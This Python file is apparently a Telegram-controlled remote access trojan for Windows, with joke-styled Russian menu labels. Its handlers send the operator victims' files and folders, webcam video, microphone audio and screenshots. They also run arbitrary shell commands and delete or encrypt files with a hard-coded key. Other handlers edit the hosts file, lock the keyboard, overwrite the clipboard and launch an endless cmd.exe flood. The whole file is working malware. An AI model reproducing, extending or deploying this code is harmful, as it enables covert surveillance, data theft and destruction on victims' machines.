import webbrowser
from PIL import ImageGrab
from time import sleep
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram import types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
import os
import shutil
import random
from cv2 import VideoWriter
from cv2 import VideoWriter_fourcc
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import cv2
import pyautogui as p
from ctypes import cast, POINTER
import ctypes
import struct
from cryptography.fernet import Fernet
import keyboard
import pyperclip
import pyttsx3
import win32api
import win32con

class Steps(StatesGroup):
    stepURL = State()
    stepMakeDir = State()
    stepRmTree = State()
    stepRmFile = State()

    stepRename = State()
    stepRename2 = State()
    
    stepReplace = State()
    stepReplace2 = State()

    stepMsg = State()
    stepDwn = State()
    stepWeb = State()
    stepAu = State()
    stepSys = State()
    stepMouse = State()
    stepWall = State()
    stepChangeDir = State()
    stepSize = State()
    stepEncrypt = State()
    stepDecrypt = State()
    stepBlock = State()
    stepKB = State()
    stepBlockUrl = State()
    stepUnblockUrl = State()
    stepDWzip = State()
    stepChEx = State()
    stepClosePG = State()
    stepSayHello = State()
    stepRotate = State()
    stepCMD = State()
    stepWrite = State()

def Open_url(dp, bot, admin_id):
    @dp.message_handler(text_contains='ОТКРЫТЬ ССЫЛКY')
    async def open_url(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'ССЫЛKA')
            await Steps.stepURL.set()

    @dp.message_handler(state=Steps.stepURL)
    async def open_url_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            await state.update_data(
                {
                    'item': message.text
                }
            )

            webbrowser.open_new(message.text)
            sleep(2)
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_document(admin_id, f, caption='В0Т СКРNH ГРИН')
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(admin_id, "N SINGAQ)\n<code>" + e + "</code>")
            await state.finish()

def ChangeDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='ПЕРЕМЕСТNTЬ ВNPYC')
    async def changedir(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'В0Т ДАННNE')
            await Steps.stepChangeDir.set()


    @dp.message_handler(state=Steps.stepChangeDir)
    async def makedir_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.chdir(message.text)
                ls = os.getcwd()
                await bot.edit_message_text("ВNPYC ТУТ:\n<code>" + ls + "</code>", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def MakeDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='С0ЗДАТЬ ПАПКУ')
    async def makedir(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ПАПКИ')
            await Steps.stepMakeDir.set()


    @dp.message_handler(state=Steps.stepMakeDir)
    async def makedir_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.makedirs(message.text)
                await bot.edit_message_text("ВЗЛ0МАНО.", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def RmTree(dp, bot, admin_id):
    @dp.message_handler(text_contains='УДАЛNTЬ ПАПКУ')
    async def rmtree(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ПАПКИ')
            await Steps.stepRmTree.set()


    @dp.message_handler(state=Steps.stepRmTree)
    async def rmtree_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                shutil.rmtree(message.text)
                await bot.edit_message_text("ВЗЛ0МАНО", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def RmFile(dp, bot, admin_id):
    @dp.message_handler(text_contains='УДАЛNTЬ ФАЙЛ')
    async def rmtree(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА')
            await Steps.stepRmFile.set()


    @dp.message_handler(state=Steps.stepRmFile)
    async def rmfile_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.remove(message.text)
                await bot.edit_message_text("ВЗЛ0МАНО", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Rename(dp, bot, admin_id):
    @dp.message_handler(text_contains='ПЕРЕNMEHOBATЬ ФАЙЛ')
    async def rename(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА ', parse_mode='HTML')
            await Steps.stepRename.set()

    @dp.message_handler(state=Steps.stepRename)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item
            item = message.text
            await state.update_data(
                {
                    'item': message.text
                }
            )
            global msg
            msg = await bot.send_message(admin_id, 'ИМR НА К0ТОРОЕ ИЗМЕНNТЬ', parse_mode='HTML')
            await Steps.stepRename2.set()

    @dp.message_handler(state=Steps.stepRename2)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item2
            item2 = message.text
            await state.update_data(
                {
                    'item2': message.text
                }
            )
            try:
                os.rename(item, item2)
                await bot.edit_message_text("ВЗЛ0МАНО.", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Replace(dp, bot, admin_id):
    @dp.message_handler(text_contains='ПЕРЕМЕСТNTЬ ФАЙЛ')
    async def replace(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА', parse_mode='HTML')
            await Steps.stepReplace.set()

    @dp.message_handler(state=Steps.stepReplace)
    async def replace_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item
            item = message.text
            await state.update_data(
                {
                    'item': message.text
                }
            )
            global msg
            msg = await bot.send_message(admin_id, 'ПУТЬ К ФАЙVУ', parse_mode='HTML')
            await Steps.stepReplace2.set()

    @dp.message_handler(state=Steps.stepReplace2)
    async def rename_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            global item2
            item2 = message.text
            await state.update_data(
                {
                    'item2': message.text
                }
            )
            try:
                os.replace(item, item2)
                await bot.edit_message_text("ВЗЛ0МАНО.", admin_id, msg.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Msg(dp, bot, admin_id):
    @dp.message_handler(text_contains='0КНО С Т3КСТОМ')
    async def msg(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '0ТПРАВЬ МН3 СООБЩЕНNE')
            await Steps.stepMsg.set()


    @dp.message_handler(state=Steps.stepMsg)
    async def msg_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                ctypes.windll.user32.MessageBoxW(0, message.text, u'', 0x1000)
                screen = ImageGrab.grab()
                screen.save(os.getcwd() + '\\sreenshot.jpg')
                f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
                await bot.send_document(admin_id, f, caption='В0Т СКРNH ГРИН')
                try:
                    os.remove(os.getcwd() + '\\sreenshot.jpg')
                except Exception as e:
                    await bot.send_message(admin_id, e)

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Dwn(dp, bot, admin_id):
    @dp.message_handler(text_contains='СКАhАТЬ ФАЙЛ')
    async def dwn(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА')
            await Steps.stepDwn.set()


    @dp.message_handler(state=Steps.stepDwn)
    async def dwn_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                f = open(message.text, 'rb')
                await bot.send_document(admin_id, f)
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Web(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАПNCЬ ВЕБКИ')
    async def web(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ДЛNТЕЛЬНОСТЬ')
            await Steps.stepWeb.set()


    @dp.message_handler(state=Steps.stepWeb)
    async def web_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 26
                webcam = cv2.VideoCapture(0)
                video = VideoWriter('webcam.avi', VideoWriter_fourcc(*'MP42'), 25.0, (640, 480))
                for x in range(1, duration):
                    stream_ok, frame = webcam.read()
                    if stream_ok:
                        video.write(frame)

                await bot.send_document(admin_id, open('webcam.avi', 'rb'))
                cv2.destroyAllWindows()
                webcam.release()
                video.release()
                try:
                    os.remove('webcam.avi')
                except:
                    pass
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()






def Au(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАПNCЬ МИКРО')
    async def au(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ДЛNТЕЛЬНОСТЬ')
            await Steps.stepAu.set()


    @dp.message_handler(state=Steps.stepAu)
    async def au_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 44

                audio = pyaudio.PyAudio()
                stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
                frames = []

                for i in range(1, duration):
                    data = stream.read(1024)
                    frames.append(data)

                stream.stop_stream()
                stream.close()
                audio.terminate()
                sound_file = wave.open('audio.wav', 'wb')
                sound_file.setnchannels(1)
                sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                sound_file.setframerate(44100)
                sound_file.writeframes(b''.join(frames))
                sound_file.close()
                await bot.send_document(admin_id, open('audio.wav', 'rb'))



                try:
                    os.remove('audio.wav')
                except:
                    pass
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Sys(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАПУСТNТЬ ФАЙЛ')
    async def sys(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА')
            await Steps.stepSys.set()


    @dp.message_handler(state=Steps.stepSys)
    async def sys_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                os.system(message.text)
                sleep(1)
                screen = ImageGrab.grab()
                screen.save(os.getcwd() + '\\sreenshot.jpg')
                f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
                await bot.send_document(admin_id, f, caption='ВЗЛ0МАНО')

                try:
                    os.remove(os.getcwd() + '\\sreenshot.jpg')
                except Exception as e:
                    await bot.send_message(admin_id, e)
            
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Mouse(dp, bot, admin_id):
    @dp.message_handler(text_contains='СВ3СТИ С УМА КУРС0Р')
    async def mouse(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ДЛNТЕЛЬНОСТЬ')
            await Steps.stepMouse.set()


    @dp.message_handler(state=Steps.stepMouse)
    async def mouse_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                duration = int(message.text)
                duration *= 17
                for x in range(1, duration):
                    p.moveTo(random.randint(0,500),random.randint(0,500))
                await bot.send_message(admin_id, 'людей просмотревших сойдут с ума')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def Wall(dp, bot, admin_id):
    @dp.message_handler(text_contains='П0МЕНЯТЬ ОБ0И')
    async def wall(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'НАЗВАНNE ФОТО')
            await Steps.stepWall.set()


    @dp.message_handler(state=Steps.stepWall)
    async def wall_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                PATH = os.getcwd() + '\\' + message.text
                SPI_SETDESKWALLPAPER = 20
                def is_64bit_windows():
                    return struct.calcsize('P') * 8 == 64

                def changeBG(path):
                    if is_64bit_windows():
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)
                    else:
                        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)

                changeBG(PATH)
                await bot.send_message(admin_id, 'ВЗЛ0МАНО')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()




def Encrypt(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАШNФРОВАТЬ ФАЙЛ')
    async def encrypt(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'НАЗВАНNE ФАЙЛА')
            await Steps.stepEncrypt.set()


    @dp.message_handler(state=Steps.stepEncrypt)
    async def encrypt_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                key = b'Lr9W2qlJw-IJHtfA87_epWlyndlOZBJD-8UzYCjkHBA='
                f = Fernet(key)
                with open(message.text, 'rb') as file:
                    file_data = file.read()
                
                encrypted_data = f.encrypt(file_data)
                
                with open(message.text, 'wb') as file:
                    file.write(encrypted_data)

                await bot.send_message(admin_id, 'ФАЙЛ БЫЛ ЗАШNФРОВАН МЕТ0ДОМ ГИТЛЕРА')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Decrypt(dp, bot, admin_id):
    @dp.message_handler(text_contains='РАСШИФРОВАТЬ ФАNV')
    async def decrypt(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА')
            await Steps.stepDecrypt.set()


    @dp.message_handler(state=Steps.stepDecrypt)
    async def decrypt_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                key = b'Lr9W2qlJw-IJHtfA87_epWlyndlOZBJD-8UzYCjkHBA='
                f = Fernet(key)

                with open(message.text, 'rb') as file:
                    encrypted_data = file.read()

                decrypted_data = f.decrypt(encrypted_data)

                with open(message.text, 'wb') as file:
                    file.write(decrypted_data)

                await bot.send_message(admin_id, 'ФАNV БЫЛ РАСШИФРОВАН МЕТ0ДОМ БЕЗНОГNM')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()



def Get_size(dp, bot, admin_id):
    @dp.message_handler(text_contains='РАЗМ3Р ФАЙЛА')
    async def get_size(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ФАЙЛА')
            await Steps.stepSize.set()


    @dp.message_handler(state=Steps.stepSize)
    async def get_size_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            try:
                size = os.stat(message.text).st_size

                dct = {'b':1024, 'K' : 1024 ** 2, 'M' : 1024 ** 3, 'G' :  1024 ** 4}
                 
                ci = 'b'
                num = int(size)
                 
                m_num = num * dct[ci]
                ret = [m_num / x[1] for x in dct.items() if x[0] != ci]
                ret = '%.3f' % ret[1]
                await bot.send_message(admin_id, 'ФАЙЛ В3СИТ ' + str(ret) + "мб")
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            await state.finish()


def BLkeyboard(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАБЛ0КИРОВАТЬ КЛАВNАТУРУ')
    async def blkeyboard(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ДЛNТЕЛЬНОСТЬ МЕНЬШЕ 150')
            await Steps.stepKB.set()


    @dp.message_handler(state=Steps.stepKB)
    async def blkeyboard_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                duration = int(message.text)
                if duration > 150:
                    await bot.send_message(admin_id, 'N! SINGAQ.')
                else:
                    await bot.send_message(admin_id, 'ВЗЛ0М НАЧАЛСЯ.')
                    for i in range(0, duration):
                        keyboard.block_key(i)
                    await bot.send_message(admin_id, 'ВЗЛ0М ЗАКОНЧЕН.')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)
            


def BlockUrl(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАБЛ0КИРОВАТЬ САЙТ')
    async def blockurl(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ССЫЛКА БЕЗ HTTPS')
            await Steps.stepBlockUrl.set()


    @dp.message_handler(state=Steps.stepBlockUrl)
    async def blockurl_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                hosts = r'C:\Windows\System32\drivers\etc\hosts'
                redirect_url = '127.0.0.1'
                blocked_sites = [message.text]
                with open(hosts, 'r+') as file:
                    src = file.read()
                    for site in blocked_sites:
                        if site in src:
                            await bot.send_message(admin_id, 'N! SINGAQ.')
                        else:
                            file.write(f'{redirect_url} {site}\n')
                            await bot.send_message(admin_id, 'ВЗЛ0МАНО')

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)





def DWzip(dp, bot, admin_id):
    @dp.message_handler(text_contains='СКАЧАТЬ ПАПКY')
    async def dwzip(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ПАПКИ')
            await Steps.stepDWzip.set()


    @dp.message_handler(state=Steps.stepDWzip)
    async def dwzip_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                item = message.text
                RandomName = random.randint(0,10000)
                shutil.make_archive(f'archive{RandomName}', 'zip', item)

                await bot.send_document(admin_id, open(f'archive{RandomName}.zip', 'rb'))


                os.remove(f'archive{RandomName}.zip')
            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)




def ChEx(dp, bot, admin_id):
    @dp.message_handler(text_contains='СМЕНNТЬ БУФЕР ОБМЕНА')
    async def chex(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '0ТПРАВЬ ТЕКСТ')
            await Steps.stepChEx.set()


    @dp.message_handler(state=Steps.stepChEx)
    async def chex_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                pyperclip.copy(message.text)
                await bot.send_message(admin_id, 'ВЗЛ0МАНО.')

            except Exception as e:
                print(e)
                await bot.send_message(admin_id, e)


def ClosePG(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАКРЫТЬ ПР0ЦЕСС')
    async def closepg(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ИМR ПР0ЦЕССА', parse_mode='HTML')
            await Steps.stepClosePG.set()


    @dp.message_handler(state=Steps.stepClosePG)
    async def closepg_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()

            a = os.system(f'taskkill /im {message.text}')
            if a == 128:
                await bot.send_message(admin_id, 'N! SINGAQ 404')
            elif a == 0:
                await bot.send_message(admin_id, 'ВЗЛ0МАНО')
            elif a == 1:
                await bot.send_message(admin_id, 'N! SINGAQ. Недостаточно ШNM')


def SayHello(dp, bot, admin_id):
    @dp.message_handler(text_contains='В0СПРОИЗВЕСТИ ТЕКСТ')
    async def sayhello(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '0ТПРАВЬ ТЕКСТ')
            await Steps.stepSayHello.set()


    @dp.message_handler(state=Steps.stepSayHello)
    async def sayhello_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            s = pyttsx3.init()
            s.say(message.text)
            s.runAndWait()
            await bot.edit_message_text("ВЗЛ0МАНО", admin_id, msg.message_id, parse_mode="HTML")




def Rotate(dp, bot, admin_id):
    @dp.message_handler(text_contains='П0ВЕРНУТЬ М0НИК')
    async def sayhello(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'ГРАДУСЫ 90;180;270;0')
            await Steps.stepRotate.set()

    @dp.message_handler(state=Steps.stepRotate)
    async def rotate_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            
            Rotations = {
                '0': win32con.DMDO_DEFAULT,
                '90': win32con.DMDO_90,
                '180': win32con.DMDO_180,
                '270': win32con.DMDO_270
            }
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                RotationValue = Rotations[message.text]
            except KeyError:
                await bot.send_message(admin_id, 'N! SINGAQ.')
            Device = win32api.EnumDisplayDevices(None, 0)
            dm = win32api.EnumDisplaySettings(Device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
            if (dm.DisplayOrientation + RotationValue) % 2 == 1:
                dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth   
            dm.DisplayOrientation = RotationValue
            win32api.ChangeDisplaySettingsEx(Device.DeviceName, dm)


def WriteText(dp, bot, admin_id):
    @dp.message_handler(text_contains='НАП3ЧАТАТЬ ТЕКСТ')
    async def writetext(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '0ТПРАВЬ ТЕКСТ')
            await Steps.stepWrite.set()

    @dp.message_handler(state=Steps.stepWrite)
    async def writetext_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:

            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                keyboard.write(message.text, delay=0.1)
            except Exception as e:
                await bot.send_message(admin_id, e)
            






def CMDBomb(dp, bot, admin_id):
    @dp.message_handler(text_contains='CMD Б0МБА')
    async def cmdbomb(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, 'К0ЛИЧЕСТВ0 CMD')
            await Steps.stepCMD.set()

    @dp.message_handler(state=Steps.stepCMD)
    async def cmdbomb_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:

            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                item = int(message.text)
                await bot.send_message(admin_id, 'ВЗЛ0М НАЧАЛСЯ')
                if item == 911:
                    while True:
                        os.startfile('cmd.exe')
                else:
                    for i in range(0, item):
                        os.startfile('cmd.exe')
            except:
                await bot.send_message(admin_id, 'N! SINGAQ.')